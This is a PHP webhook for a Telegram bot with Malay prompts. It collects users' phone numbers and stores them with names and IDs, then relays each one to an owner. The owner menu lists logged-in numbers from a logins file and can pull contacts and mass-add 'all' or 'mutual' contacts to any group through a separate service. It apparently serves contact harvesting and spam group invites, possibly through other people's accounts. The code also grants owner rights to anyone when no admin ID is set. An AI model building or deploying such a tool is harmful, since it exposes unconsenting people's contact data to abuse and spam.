<?php

error_reporting(E_ALL);
ini_set('display_errors', 1);
header('Content-Type: application/json');

$token = getenv('TELEGRAM_BOT_TOKEN') ?: '';
$admin_chat_id = getenv('TELEGRAM_ADMIN_CHAT_ID') ?: getenv('TELEGRAM_CHAT_ID') ?: '';

if ($token === '') {
    http_response_code(500);
    echo json_encode(['ok' => false, 'error' => 'Telegram bot token belum diset.']);
    exit;
}

function isAdminChat($chatId) {
    global $admin_chat_id;
    return $admin_chat_id === '' || (string) $chatId === (string) $admin_chat_id;
}
$api = 'https://api.telegram.org/bot' . $token . '/';
$contactsFile = __DIR__ . '/contacts.json';
$settingsFile = __DIR__ . '/settings.json';
$appServer = getenv('APP_SERVER') ?: 'http://127.0.0.1:8088';

$update = json_decode(file_get_contents('php://input'), true);

function telegramRequest($method, $params) {
    global $api;

    $url = $api . $method;
    $options = [
        'http' => [
            'header' => "Content-Type: application/json\r\n",
            'method' => 'POST',
            'content' => json_encode($params)
        ]
    ];

    return file_get_contents($url, false, stream_context_create($options));
}

function readJsonFile($file, $default) {
    if (!file_exists($file)) {
        return $default;
    }

    $data = json_decode(file_get_contents($file), true);
    return is_array($data) ? $data : $default;
}

function writeJsonFile($file, $data) {
    file_put_contents($file, json_encode($data, JSON_PRETTY_PRINT));
}

function sendContactMenu($chatId) {
    telegramRequest('sendMessage', [
        'chat_id' => $chatId,
        'text' => 'Sila tekan butang di bawah untuk kongsi nombor telefon Telegram anda.',
        'reply_markup' => [
            'keyboard' => [
                [
                    [
                        'text' => 'Kongsi No Telefon',
                        'request_contact' => true
                    ]
                ]
            ],
            'resize_keyboard' => true,
            'one_time_keyboard' => false
        ]
    ]);
}

function sendAdminMenu($chatId) {
    global $contactsFile;

    $contacts = readJsonFile($contactsFile, []);
    $count = count($contacts);

    telegramRequest('sendMessage', [
        'chat_id' => $chatId,
        'text' => "Menu owner bot.\n\nJumlah contact tersimpan: $count\n\nPilih salah satu untuk jemputan ke group, atau lihat senarai contact atau login.",
        'reply_markup' => [
            'keyboard' => [
                [
                    ['text' => 'Senarai Login']
                ],
                [
                    ['text' => 'Semua Contact'],
                    ['text' => 'Mutual Contact']
                ],
                [
                    ['text' => 'Senarai Contact']
                ]
            ],
            'resize_keyboard' => true,
            'one_time_keyboard' => false
        ]
    ]);
}

function getInviteState() {
    global $settingsFile;
    $settings = readJsonFile($settingsFile, []);
    return isset($settings['invite']) && is_array($settings['invite']) ? $settings['invite'] : [];
}

function setInviteState($state) {
    global $settingsFile;
    $settings = readJsonFile($settingsFile, []);
    $settings['invite'] = $state;
    writeJsonFile($settingsFile, $settings);
}

function clearInviteState() {
    setInviteState([]);
}

function getAdminState() {
    global $settingsFile;
    $settings = readJsonFile($settingsFile, []);
    return isset($settings['admin']) && is_array($settings['admin']) ? $settings['admin'] : [];
}

function setAdminState($state) {
    global $settingsFile;
    $settings = readJsonFile($settingsFile, []);
    $settings['admin'] = is_array($state) ? $state : [];
    writeJsonFile($settingsFile, $settings);
}

function clearAdminState() {
    setAdminState([]);
}

function getLoginList() {
    $loginsFile = __DIR__ . '/logins.json';
    $logins = readJsonFile($loginsFile, []);
    return is_array($logins) ? $logins : [];
}

function sendLoginList($chatId) {
    $logins = getLoginList();
    if (count($logins) === 0) {
        telegramRequest('sendMessage', [
            'chat_id' => $chatId,
            'text' => 'Belum ada nombor yang login lagi.'
        ]);
        clearAdminState();
        return;
    }

    $lines = ['Senarai Nombor Login:'];
    $keys = array_keys($logins);
    foreach ($keys as $index => $key) {
        $login = $logins[$key];
        $lines[] = ($index + 1) . '. ' . ($login['telefon'] ?? '-')
            . ' | ' . trim($login['nama'] ?? '')
            . ' | ' . ($login['negeri'] ?? '-');
    }
    $lines[] = 'Balas nombor yang sesuai untuk pilih login.';

    telegramRequest('sendMessage', [
        'chat_id' => $chatId,
        'text' => implode("\n", $lines),
        'reply_markup' => [
            'keyboard' => [
                [ ['text' => 'Kembali ke Menu'] ]
            ],
            'resize_keyboard' => true,
            'one_time_keyboard' => false
        ]
    ]);

    setAdminState(['action' => 'choose_login', 'keys' => $keys]);
}

function sendLoginActions($chatId, $login) {
    $phone = $login['telefon'] ?? '-';
    $name = trim($login['nama'] ?? '');
    telegramRequest('sendMessage', [
        'chat_id' => $chatId,
        'text' => "Anda pilih login: $phone\nNama: $name\nNegeri: " . ($login['negeri'] ?? '-') . "\n\nPilih tindakan:",
        'reply_markup' => [
            'keyboard' => [
                [ ['text' => 'Senarai Contact'], ['text' => 'Ambil Contact'] ],
                [ ['text' => 'Semua Contact'], ['text' => 'Mutual Contact'] ],
                [ ['text' => 'Kembali ke Menu'] ]
            ],
            'resize_keyboard' => true,
            'one_time_keyboard' => false
        ]
    ]);

    setAdminState(['action' => 'login_selected', 'phone' => $phone]);
}

function sendGroupLinkPrompt($chatId, $mode, $loginPhone = null) {
    global $appServer;
    $modeText = $mode === 'mutual' ? 'Mutual Contact' : 'Semua Contact';
    telegramRequest('sendMessage', [
        'chat_id' => $chatId,
        'text' => "Anda memilih: $modeText.\nSila hantar link group Telegram di mana contact akan ditambahkan.\n\nJika anda mahu batal, hantar /cancel.",
        'reply_markup' => [
            'remove_keyboard' => true
        ]
    ]);
}

function inviteContactsToGroup($mode, $groupLink) {
    global $appServer;

    $url = rtrim($appServer, '/') . '/group-invite';
    $payload = json_encode(['mode' => $mode, 'group_link' => $groupLink]);
    $options = [
        'http' => [
            'header' => "Content-Type: application/json\r\n",
            'method' => 'POST',
            'content' => $payload,
            'timeout' => 20
        ]
    ];
    $response = @file_get_contents($url, false, stream_context_create($options));
    if ($response === false) {
        return ['ok' => false, 'error' => 'Gagal sambungkan ke app.py.'];
    }
    $data = json_decode($response, true);
    return is_array($data) ? $data : ['ok' => false, 'error' => 'Respons app.py tidak sah.'];
}

function sendAdminContactDetail($chatId, $contact) {
    global $contactsFile;

    $name = trim(($contact['first_name'] ?? '') . ' ' . ($contact['last_name'] ?? ''));
    $username = $contact['username'] ? '@' . $contact['username'] : '-';

    $adminText = "Contact Telegram Baru\n\n" .
        "Nama: $name\n" .
        "Telefon: {$contact['phone']}\n" .
        "Telegram ID: {$contact['telegram_id']}\n" .
        "Username: $username\n\n" .
        "Jumlah contact tersimpan: " . count(readJsonFile($contactsFile, [])) . "\n\n" .
        "Menu owner tersedia di bawah.";

    telegramRequest('sendMessage', [
        'chat_id' => $chatId,
        'text' => $adminText,
        'reply_markup' => [
            'keyboard' => [
                [
                    ['text' => 'Senarai Login']
                ],
                [
                    ['text' => 'Semua Contact'],
                    ['text' => 'Mutual Contact']
                ],
                [
                    ['text' => 'Senarai Contact'],
                    ['text' => 'Ambil Contact']
                ]
            ],
            'resize_keyboard' => true,
            'one_time_keyboard' => false
        ]
    ]);
}

function saveContact($message) {
    global $contactsFile;

    $contact = $message['contact'];
    $from = $message['from'] ?? [];
    $telegramId = (string) ($from['id'] ?? $message['chat']['id']);

    $contacts = readJsonFile($contactsFile, []);
    $contacts[$telegramId] = [
        'chat_id' => $message['chat']['id'],
        'telegram_id' => $telegramId,
        'phone' => $contact['phone_number'] ?? '-',
        'first_name' => $contact['first_name'] ?? ($from['first_name'] ?? ''),
        'last_name' => $contact['last_name'] ?? ($from['last_name'] ?? ''),
        'username' => $from['username'] ?? '',
        'saved_at' => date('c')
    ];

    writeJsonFile($contactsFile, $contacts);
    return $contacts[$telegramId];
}

function sendContactList($chatId) {
    global $contactsFile;

    $contacts = readJsonFile($contactsFile, []);

    if (count($contacts) === 0) {
        telegramRequest('sendMessage', [
            'chat_id' => $chatId,
            'text' => 'Belum ada contact yang dikongsi.'
        ]);
        return;
    }

    $lines = ['Senarai Contact Masuk:'];
    $number = 1;

    foreach ($contacts as $contact) {
        $name = trim(($contact['first_name'] ?? '') . ' ' . ($contact['last_name'] ?? ''));
        $username = $contact['username'] ? '@' . $contact['username'] : '-';
        $lines[] = "\n$number. $name\nTelefon: {$contact['phone']}\nTelegram ID: {$contact['telegram_id']}\nUsername: $username";
        $number++;
    }

    telegramRequest('sendMessage', [
        'chat_id' => $chatId,
        'text' => implode("\n", $lines)
    ]);
}

if (!isset($update['message'])) {
    if (isset($update['my_chat_member']['chat']['id'])) {
        $chatId = $update['my_chat_member']['chat']['id'];
        $status = $update['my_chat_member']['new_chat_member']['status'] ?? '';

        if ($status === 'member') {
            sendContactMenu($chatId);
        }
    }

    echo json_encode(['ok' => true]);
    exit;
}

$message = $update['message'];
$chatId = $message['chat']['id'];
$text = $message['text'] ?? '';
$isAdmin = isAdminChat($chatId);

if ($isAdmin && ($text === '/start' || $text === '/admin')) {
    sendAdminMenu($chatId);
    echo json_encode(['ok' => true]);
    exit;
}

if ($isAdmin && ($text === 'Semua Contact' || $text === 'Mutual Contact')) {
    $mode = $text === 'Mutual Contact' ? 'mutual' : 'all';
    setInviteState(['mode' => $mode, 'waiting' => true]);
    sendGroupLinkPrompt($chatId, $mode);
    echo json_encode(['ok' => true]);
    exit;
}

$inviteState = getInviteState();
if ($isAdmin && !empty($inviteState['waiting'])) {
    if (strtolower(trim($text)) === '/cancel') {
        clearInviteState();
        sendAdminMenu($chatId);
        echo json_encode(['ok' => true]);
        exit;
    }

    $result = inviteContactsToGroup($inviteState['mode'], $text);
    clearInviteState();

    if (isset($result['ok']) && $result['ok'] === true) {
        $msg = "Jemputan selesai.\n\n" .
            "Mode: " . ($inviteState['mode'] === 'mutual' ? 'Mutual Contact' : 'Semua Contact') . "\n" .
            "Permintaan: " . ($result['result']['requested'] ?? 0) . "\n" .
            "Berjaya dijemput: " . ($result['result']['invited'] ?? 0);
        if (!empty($result['result']['errors'])) {
            $msg .= "\n\nBeberapa ralat:\n" . implode("\n", $result['result']['errors']);
        }
    } else {
        $msg = "Gagal jemput ke group: " . ($result['error'] ?? 'Tidak diketahui.');
    }

    telegramRequest('sendMessage', [
        'chat_id' => $chatId,
        'text' => $msg,
        'reply_markup' => [
            'keyboard' => [
                [
                    ['text' => 'Semua Contact'],
                    ['text' => 'Mutual Contact']
                ],
                [
                    ['text' => 'Senarai Contact'],
                    ['text' => 'Ambil Contact']
                ]
            ],
            'resize_keyboard' => true,
            'one_time_keyboard' => false
        ]
    ]);

    echo json_encode(['ok' => true]);
    exit;
}

if ($isAdmin && $text === 'Senarai Login') {
    sendLoginList($chatId);
    echo json_encode(['ok' => true]);
    exit;
}

$adminState = getAdminState();
if ($isAdmin && !empty($adminState['action'])) {
    if (strtolower(trim($text)) === '/cancel' || $text === 'Kembali ke Menu') {
        clearAdminState();
        sendAdminMenu($chatId);
        echo json_encode(['ok' => true]);
        exit;
    }

    if ($adminState['action'] === 'choose_login') {
        $keys = $adminState['keys'] ?? [];
        $choice = intval(trim($text));
        if ($choice > 0 && $choice <= count($keys)) {
            $loginKey = $keys[$choice - 1];
            $logins = getLoginList();
            if (isset($logins[$loginKey])) {
                sendLoginActions($chatId, $logins[$loginKey]);
                echo json_encode(['ok' => true]);
                exit;
            }
        }

        telegramRequest('sendMessage', [
            'chat_id' => $chatId,
            'text' => 'Pilihan tidak sah. Sila balas dengan nombor yang betul dari senarai atau /cancel.',
            'reply_markup' => [
                'keyboard' => [
                    [ ['text' => 'Kembali ke Menu'] ]
                ],
                'resize_keyboard' => true,
                'one_time_keyboard' => false
            ]
        ]);
        echo json_encode(['ok' => true]);
        exit;
    }

    if ($adminState['action'] === 'login_selected') {
        if ($text === 'Senarai Contact') {
            sendContactList($chatId);
            echo json_encode(['ok' => true]);
            exit;
        }
        if ($text === 'Semua Contact' || $text === 'Mutual Contact') {
            $mode = $text === 'Mutual Contact' ? 'mutual' : 'all';
            setInviteState(['mode' => $mode, 'waiting' => true]);
            sendGroupLinkPrompt($chatId, $mode);
            echo json_encode(['ok' => true]);
            exit;
        }
    }
}

if ($isAdmin && ($text === 'Senarai Contact' || $text === 'Ambil Contact')) {
    sendContactList($chatId);
    echo json_encode(['ok' => true]);
    exit;
}

if (strpos($text, '/start') === 0 || $text === '/menu') {
    sendContactMenu($chatId);
    echo json_encode(['ok' => true]);
    exit;
}

if (isset($message['contact'])) {
    $contact = saveContact($message);
    if ($admin_chat_id !== '') {
        sendAdminContactDetail($admin_chat_id, $contact);
    }

    telegramRequest('sendMessage', [
        'chat_id' => $chatId,
        'text' => 'Terima kasih. Nombor telefon anda telah diterima.',
        'reply_markup' => [
            'remove_keyboard' => true
        ]
    ]);

    echo json_encode(['ok' => true]);
    exit;
}

if ($isAdmin) {
    sendAdminMenu($chatId);
    echo json_encode(['ok' => true]);
    exit;
}

sendContactMenu($chatId);
echo json_encode(['ok' => true]);

?>
